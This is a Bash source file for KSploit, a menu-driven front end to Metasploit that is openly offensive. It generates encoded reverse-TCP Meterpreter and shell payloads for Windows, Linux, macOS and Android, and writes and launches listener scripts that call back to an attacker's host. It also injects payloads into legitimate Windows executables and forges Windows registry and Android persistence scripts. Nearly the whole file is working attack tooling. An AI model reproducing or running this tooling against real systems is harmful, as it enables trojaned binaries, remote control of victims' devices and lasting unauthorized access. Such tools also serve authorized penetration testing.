#!/bin/bash
# Script: KSploit v 2.1
# Author: Kaotick Jay
# Github: https://github.com/kaotickj/KSploit
# Website: https://kdgwebsolutions.com

# Include Modularized Scripts
source functions.sh
# source ./modules/post_exploit.sh

################################################################################
# Payloads Menu
################################################################################
payloads()
{
  clear
  echo ${LIGHT_CYAN}'
   ____             _                 _     
  |  _ \ __ _ _   _| | ___   __ _  __| |___ 
  | |_) / _` | | | | |/ _ \ / _` |/ _` / __|
  |  __/ (_| | |_| | | (_) | (_| | (_| \__ \
  |_|   \__,_|\__, |_|\___/ \__,_|\__,_|___/
	      |___/                         
 '${FGC}${YELLOW}
	for i in {1..21}; do
		echo -ne "   $(printf '💰%.0s' $(seq 1 $i))\r"
		sleep .1
	done
	echo -ne '                 Built to run. Born to exploit.\n'
	sleep .5
 
   echo "${NC}${LIGHT_MAGENTA}  Use the payloads menu to quickly and easily craft metasploit payloads for a wide variety of targets." |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #pay:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}        KSploit Payloads Menu Options:       ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Payloads.                   ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Payloads.                     ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🍎${GREEN} 3 ${BLUE}Mac OSX Reverse TCP.                ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🤖${GREEN} 4 ${BLUE}Android Meterpreter Reverse TCP.    ${YELLOW}|"
#   echo "	  |---------------------------------------------|"
#   echo "	  |    🐍${GREEN} 5 ${BLUE}Unix Reverse Python.                ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to main menu.                  ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
   echo
   echo
   locals
   case "$opt" in
        1)
          winpayloads
        ;;  
	2)
	  linpayloads
	;;	
	3)
          echo
          echo "          ${FGC}   Crafting a Mac OSX Reverse TCP Payload :   ${NC}${YELLOW}"
	  prompt_ip_port
	  echo "	    💰💰💰 Generating mac osx payload ..."	
	  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$attackerip LPORT=$attackerport -f macho > $wdir/shell.macho
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.macho saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto pay;
	;;
	4)
          echo
          echo "          ${FGC}  Crafting an Android Meterpreter Payload :   ${NC}${YELLOW}"
	  prompt_ip_port
	  echo "	    💰💰💰 Generating android meterpreter payload ..."	
	  msfvenom -p android/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport R > $wdir/shell.apk
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.apk saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
          goto pay;
	;;  
        q)
          clear
          goto $start
        ;;
        *)
          clear 
          error="$opt is not a valid option!"      	
          goto pay;
        ;;
   esac    
}

################################################################################
# Linux Payloads Menu
################################################################################
linpayloads()
{
  clear
   #linpay:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}      KSploit Linux Payloads Menu Options:   ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 1 ${BLUE}Linux x86 Meterpreter Reverse TCP.  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux x64 Meterpreter Reverse TCP.  ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
   echo
   echo
   locals
   case "$opt" in
	1)
	  echo 
          echo "  ${FGC}    Crafting a Linux x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
	  prompt_ip_port
	  echo "	    💰💰💰 Generating linux x86 meterpreter payload ..."	
	  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell.elf
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.elf saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto linpay;
	;;
	2)
	  echo 
          echo "  ${FGC}    Crafting a Linux x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
	  prompt_ip_port
	  echo "	    💰💰💰 Generating linux x64 meterpreter payload ..."	
	  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -f elf > $wdir/shell64.elf
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.elf saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto linpay;
	;;
	q)
	  clear
	  goto pay;
	;;
	*)
          clear 
          error="$opt is not a valid option!"      	
          goto linpay;
	;;
   esac
}

################################################################################
# Windows Payloads Menu
################################################################################
winpayloads()
{
  clear
   #winpay:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}    KSploit Windows Payloads Menu Options:   ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows x86 Meterpreter Reverse TCP.${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 2 ${BLUE}Windows x64 Meterpreter Reverse TCP.${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to payloads menu.              ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,q]    " opt
   echo
   echo
   locals
   case "$opt" in
	1)
	  echo 
	  echo "  ${FGC}    Crafting a Windows x86 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
    	  prompt_ip_port
	  echo "	    💰💰💰 Generating shikata ga nai encoded payload ..."	
	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x86/shikata_ga_nai -i 10 -f exe > $wdir/shell.exe
	  echo
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell.exe saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto winpay;
	;;
	2)
	  echo 
	  echo "  ${FGC}    Crafting a Windows x64 Meterpreter Reverse TCP Payload :   ${NC}${YELLOW}"
    	  prompt_ip_port
	  echo "	    💰💰💰 Generating xor encoded payload ..."	
	  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$attackerip LPORT=$attackerport -e x64/xor -i 10 -f exe > $wdir/shell64.exe
	  echo
	  echo -e "         ${FGG}${YELLOW}   💰💰💰   $wdir/shell64.exe saved   💰💰💰   ${NC}${GREEN}"
          pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
	  goto winpay;
	;;
	q)
	  clear
	  goto pay;
	;;
	*)
          clear 
          error="$opt is not a valid option!"      	
          goto winpay;
	;;
   esac
}

################################################################################
# Listeners Menu
################################################################################
listeners()
{
  clear
  echo ${LIGHT_CYAN}'
   _     _     _                           
  | |   (_)___| |_ ___ _ __   ___ _ __ ___ 
  | |   | / __| __/ _ \\ '_ \\ / _ \\ '__/ __|
  | |___| \__ \ ||  __/ | | |  __/ |  \__ \
  |_____|_|___/\__\___|_| |_|\___|_|  |___/
'${FGC}${YELLOW}
	for i in {1..21}; do
		echo -ne "   $(printf '👂%.0s' $(seq 1 $i))\r"
		sleep .1
	done
	echo -ne '                 Can you hear me now? Good!\n'
	sleep .5
   echo "${NC}${LIGHT_MAGENTA}  Use the listeners menu to craft and quickly deploy metasploit listeners." |fmt -w 60
   echo
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   #listen:
   clear
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}      KSploit Listeners Menu Options:        ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Meterpreter Reverse TCP.    ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Meterpreter Reverse TCP.      ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🍎${GREEN} 3 ${BLUE}OSX Reverse TCP listener.           ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🤖${GREEN} 4 ${BLUE}Android Reverse TCP listener.       ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
   echo
   echo
   locals
   case "$opt" in
        1)
            echo
            touch $wdir/meterpreter.rc
            echo "    ${FGC}  Crafting a Windows Meterpreter Reverse TCP Listener :    ${NC}${YELLOW}"
            echo use multi/handler > $wdir/meterpreter_windows.rc
            echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> $wdir/meterpreter_windows.rc
            prompt_ip_port
            echo set LHOST $attackerip >> $wdir/meterpreter_windows.rc
            echo set LPORT $attackerport >> $wdir/meterpreter_windows.rc
            echo run >> $wdir/meterpreter_windows.rc
            echo
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_windows.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            launch_msfconsole "$wdir/meterpreter_windows.rc"
	    sleep 2
            goto listen;
            ;;
        2)
            echo
            touch $wdir/meterpreter_linux.rc
            echo "    ${FGC}    Crafting a Linux Meterpreter Reverse TCP Listener :     ${NC}${YELLOW}"
            echo use exploit/multi/handler > $wdir/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> $wdir/meterpreter_linux.rc
            prompt_ip_port
            echo set LHOST $attackerip >> $wdir/meterpreter_linux.rc
            echo set LPORT $attackerport >> $wdir/meterpreter_linux.rc
            echo run >> $wdir/meterpreter_linux.rc
            echo
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_linux.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            launch_msfconsole "$wdir/meterpreter_linux.rc"
	    sleep 2
            goto listen;
            ;;
        3)
            echo
            touch $wdir/meterpreter_mac.rc
            echo "          ${FGC}    Crafting an OSX Reverse TCP Listener :     ${NC}${YELLOW}"
            echo use exploit/multi/handler > $wdir/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> $wdir/meterpreter_mac.rc
	    prompt_ip_port
            echo set LHOST $attackerip >> $wdir/meterpreter_mac.rc
            echo set LPORT $attackerport >> $wdir/meterpreter_mac.rc
            echo run >> $wdir/meterpreter_mac.rc
            echo
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_mac.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            launch_msfconsole "$wdir/meterpreter_mac.rc" 
	    sleep 2
            goto listen;
            ;;
        4)
            echo
            touch $wdir/meterpreter_droid.rc
            echo "         ${FGC}     Crafting a Android Reverse TCP Listener :     ${NC}${YELLOW}"
            echo use exploit/multi/handler > $wdir/meterpreter_droid.rc
            echo set PAYLOAD android/meterpreter/reverse_tcp >> $wdir/meterpreter_droid.rc
            prompt_ip_port
            echo set LHOST $attackerip >> $wdir/meterpreter_droid.rc
            echo set LPORT $attackerport >> $wdir/meterpreter_droid.rc
            echo run >> $wdir/meterpreter_droid.rc
	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_droid.rc."
	    echo "${GREEN}            ---> Finished crafting listener."
	    sleep 1
	    echo
	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
            launch_msfconsole "$wdir/meterpreter_droid.rc" 
	    sleep 2
            goto listen;
            ;;  
         q)
            clear
            goto start;
            ;;
         *)
           clear 
           error="$opt is not a valid option!"      	
           goto listen;
         ;;
    esac
}     
                                
################################################################################
# Migrate to Msfconsole
################################################################################
mfconsole()
{
  echo 	
  echo "${YELLOW}          --> Migrating to metasploit-framework ..."
  echo
  sudo msfdb run
  tput sgr0 
  goodbye
}	  

################################################################################
# Persistence Menu
################################################################################
persist() {
    clear
    echo "${LIGHT_CYAN}"
    echo "   ____               _     _                      "
    echo "  |  _ \ ___ _ __ ___(_)___| |_ ___ _ __   ___ ___ "
    echo "  | |_) / _ \ '__/ __| / __| __/ _ \ '_ \ / __/ _ \\${GREEN}"
    echo "  |  __/  __/ |  \__ \ \__ \ ||  __/ | | | (_|  __/${LIGHT_MAGENTA}"
    echo "  |_|   \___|_|  |___/_|___/\__\___|_| |_|\___\___|"${FGC}${YELLOW}
	for i in {1..21}; do
		echo -ne "   $(printf '⌛%.0s' $(seq 1 $i))\r"
		sleep .1
	done
	echo -ne '                 Stay awhile - and listen \n'
	sleep .5
    echo ${NC}${LIGHT_MAGENTA}
    echo "  Use the persistence menu to quickly forge persistence scripts. Currently supports windows and android scripts." | fmt -w 60
    echo
    pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
    #stay:
    clear
    echo ${YELLOW}
    echo "      _____________________________________________"
    echo "     |${FGG}       KSploit Persistence Menu Options:     ${NC}${YELLOW}|"
    echo "     |---------------------------------------------|"
    echo "     |    🖥️ ${GREEN} 1 ${BLUE}Windows Persistence Script.         ${YELLOW}|"
    echo "     |---------------------------------------------|"
    echo "     |    🤖${GREEN} 2 ${BLUE}Android Persistence Script.         ${YELLOW}|"
    echo "     |---------------------------------------------|"
    echo "     |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
    echo "     |_____________________________________________${YELLOW}|${GREEN}"
    echo
    errors
    echo "${GREEN}"
    read -n1 -p "          What do you want to do? Choose: [1,2,q]    " opt
    echo
    echo
    locals
    case $opt in
        1)
            echo "          ${FGC}    Forging a Windows x64 Persistence Script:${NC}${YELLOW}"
            echo
            prompt_ip_port
            read -p '        Set Session ID: ' session
            echo
            echo "  📌 After you get a Meterpreter session, background it by typing:" | fmt -w 60
            echo "     ${FGC}${LIGHT_CYAN} background ${NC}${YELLOW}"
            echo
            echo "  Then, from the msfconsole prompt, run:" | fmt -w 60
            echo
            echo "     ${FGC}${LIGHT_CYAN} use exploit/windows/local/registry_persistence"
            echo "     set SESSION $session"
            echo "     set LHOST $attackerip"
            echo "     set LPORT $attackerport"
            echo "     run ${NC}${YELLOW}"
            echo
            persist_cmd="use exploit/windows/local/registry_persistence; set SESSION $session; set LHOST $attackerip; set LPORT $attackerport; run"

            # Clipboard support
            if command -v xclip >/dev/null 2>&1; then
                printf "%s" "$persist_cmd" | xclip -selection clipboard
                echo "     📋 Commands copied to clipboard (via xclip)."
            elif command -v xsel >/dev/null 2>&1; then
                printf "%s" "$persist_cmd" | xsel --clipboard
                echo "     📋 Commands copied to clipboard (via xsel)."
            elif command -v wl-copy >/dev/null 2>&1; then
                printf "%s" "$persist_cmd" | wl-copy
                echo "     📋 Commands copied to clipboard (via wl-copy)."
            elif command -v pbcopy >/dev/null 2>&1; then
                printf "%s" "$persist_cmd" | pbcopy
                echo "     📋 Commands copied to clipboard (via pbcopy)."
            else
                echo "     ⚠️ Clipboard copy not available. Manually copy the commands above."
            fi
            echo
            pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
            goto stay
            ;;
        2)
            echo "         ${FGC}     Forging an Android Persistence Script :     ${NC}${YELLOW}"
            touch $wdir/android.sh
            echo "#!/bin/bash" > $wdir/android.sh
            echo "while :" >> $wdir/android.sh
            echo "do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> $wdir/android.sh
            echo "sleep 20" >> $wdir/android.sh
            echo "done" >> $wdir/android.sh
            chmod +x $wdir/android.sh
            sleep 2
            echo 
            echo -e "          ⌛⌛⌛ Your Persistence Script saved to $wdir/android.sh "
            echo -e "                Upload it to / on target android device${NC}"
            echo 
            pause '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
            goto stay
            ;;
        q)
            clear
            goto start
            ;;
        *)
            clear
            error="$opt is not a valid option!"
            goto stay
            ;;
    esac
}
################################################################################
# Windows executable payload injection
################################################################################
malexe()
{
    echo
    clear 
    errors
    echo
    echo 
    echo -e "          ${BLUE}  -------------------------------------------------------------"
    echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
    echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
    echo
    echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
    echo
    locals
    echo ${LIGHT_CYAN}
    prompt_ip_port
    echo -e "               💉💉💉💉💉💉💉💉💉💉💉💉💉"  
    echo ${LIGHT_CYAN}

    if command -v dialog > /dev/null; then
        exepath=$(dialog --title "Load file" --stdout --title "Please choose a windows exe to inject" --fselect "$wdir/" 14 48)
        [ -n "$exepath" ] && pickfile "$exepath"
        echo
        clear 
        errors
        echo
        echo 
        echo -e "          ${BLUE}  -------------------------------------------------------------"
        echo -e "           | ${FGC}${LIGHT_CYAN}   💉💉💉  Windows Executable Payload Injection  💉💉💉    ${NC}${BLUE} |" 
        echo -e "            -------------------------------------------------------------${LIGHT_CYAN}"
        echo
        echo "             ${FGC}${LIGHT_CYAN}     Injecting a Windows Executable :     ${NC}${LIGHT_CYAN}"
        echo
        locals
        echo ${LIGHT_CYAN}
        echo "   	       Loaded: $exepath"
    else
        echo -e "   	      ${FGC} ⚠️   Consider:  (sudo apt-get install dialog)  ${NC}${LIGHT_CYAN}"
        echo	
        read -p '   	       Path to exe for injection* ' exepath
    fi

    # Compatibility Pre-checks
    echo -e "\n${FGC}${YELLOW} 🧪 Scanning binary for compatibility...${NC}"
    fileinfo=$(file "$exepath")

    if ! echo "$fileinfo" | grep -qE "PE32"; then
        echo -e "${FGR}${RED} ✖ Error: Not a PE32/PE32+ Windows binary.${NC}"
        pause '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
        goto start;
    fi

    if echo "$fileinfo" | grep -qi "Mono" || strings "$exepath" | grep -q "mscoree.dll"; then
        echo -e "${FGR}${RED} ✖ Error: .NET/Managed executable detected — not compatible.${NC}"
        pause '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
        goto start;
    fi

    if upx -qt "$exepath" 2>/dev/null; then
        echo -e "${FGR}${RED} ✖ Error: UPX-packed executable detected. Please unpack it first.${NC}"
        pause '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
        goto start;
    fi

    if echo "$fileinfo" | grep -q "PE32+ executable"; then
        binarch="x64"
    else
        binarch="x86"
    fi

    echo -e "${FGC}${GREEN} ✔ Binary appears clean. Architecture: $binarch${NC}"

    # Set payload/encoder
    if [[ "$binarch" == "x64" ]]; then
        PAYLOAD="windows/x64/meterpreter/reverse_tcp"
        ENCODER="x64/xor"
    else
        PAYLOAD="windows/meterpreter/reverse_tcp"
        ENCODER="x86/shikata_ga_nai"
    fi

    read -p '   	       Output filename* ' outputname
    outputpath="$wdir/$outputname"
    echo 
    echo -e "               💉💉💉 Injecting payload into $outputpath ..."

    # Execute payload injection
    msfvenom --platform windows -x "$exepath" -k -p "$PAYLOAD" lhost="$attackerip" lport="$attackerport" -f exe -o "$outputpath"

    # 💉 Animated Success Banner
    if [ -f "$outputpath" ]; then
        for i in {1..21}; do
            echo -ne "           $(printf '💉%.0s' $(seq 1 $i))\r"
            sleep .1
        done
        echo -e "         ${FGG}${YELLOW} 💉💉💉 $outputpath saved 💉💉💉   ${NC}${LIGHT_CYAN}"'\r'
        echo
        echo
        pause  '           '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
    else 
        echo -e "${FGR}${RED} ✖ Payload generation failed. File not created.${NC}"
        pause  '           '${FGR}${YELLOW}' Press [Enter] key to continue...'${NC}
    fi

    goto start;
    exit 1;
}

################################################################################
# INITIALIZE
################################################################################
clear

[[ `id -u` -eq 0 ]] || {
	clear 
	echo
	echo 
	echo -e "           ${FGR}${LG}💀 Must run as root (sudo ./ksploit.sh) 💀 ${NC}${RED}" 
	badbye
}

################################################################################
################################################################################
# Main program                                                                 #
################################################################################
################################################################################
   echo
   echo "    ${RED} _  __${LIGHT_MAGENTA} ____       _       _ _   "
   echo "    ${RED}| |/ /${LIGHT_MAGENTA}/ ___| ___ | | ___ (_) |_ "
   echo "    ${RED}| ' /${LIGHT_MAGENTA}\\___ \| '_ \| |/ _ \| | __|"
   echo "    ${RED}| . \\${LIGHT_MAGENTA} ___) | |_) | | (_) | | |_ "
   echo "    ${RED}|_|\_\\${LIGHT_MAGENTA}____/| .__/|_|\___/|_|\__|"
   echo "    ${RED}       ${LIGHT_MAGENTA}    |_|                  "${FGC}${YELLOW};
	for i in {1..21}; do
		echo -ne "   $(printf '👽%.0s' $(seq 1 $i))\r"
		sleep .1
	done
	echo -ne '                 🕵🔎 Courtesy of Kaotick Jay 👽\r'${NC}
	sleep .5
   echo "${LIGHT_MAGENTA}  "
   echo
   echo "  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits" |fmt -w 60
   echo 
   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
   start=${1:-"start"}
	#start:
   clear
   echo
   echo ${YELLOW}
   echo "	   _____________________________________________"
   echo "	  |${FGG}           KSploit Main Menu Options:        ${NC}${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    👂${GREEN} 1 ${BLUE}Listeners Menu.                     ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    💰${GREEN} 2 ${BLUE}Payloads menu.                      ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    💉${GREEN} 3 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
   echo "	  |---------------------------------------------|"
#   echo "	  |    ▶️ ${GREEN} 5 ${BLUE}Run Post Exploitation Module.       ${YELLOW}|"
#   echo "	  |---------------------------------------------|"
   echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
   echo "	  |---------------------------------------------|"
   echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
   echo "	  |_____________________________________________${YELLOW}|${GREEN}"
   echo	
#   locals	
   echo	"           $ME"

   echo ${NC}
   errors
   echo "${GREEN}"
   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,M,q]    " opt
   case "$opt" in
       1) listeners
         ;;
       2) payloads
         ;;
       3) malexe
         ;;
       4) persist
         ;;
#       5) post_exploit
#         ;;
       M) mfconsole
         ;;
       q)
	echo 
	echo 
	echo ${YELLOW}
	goodbye
	 ;; 
       *)clear 
         error="$opt is not a valid option!"
         goto $start
       ;;
    esac
tput sgr0 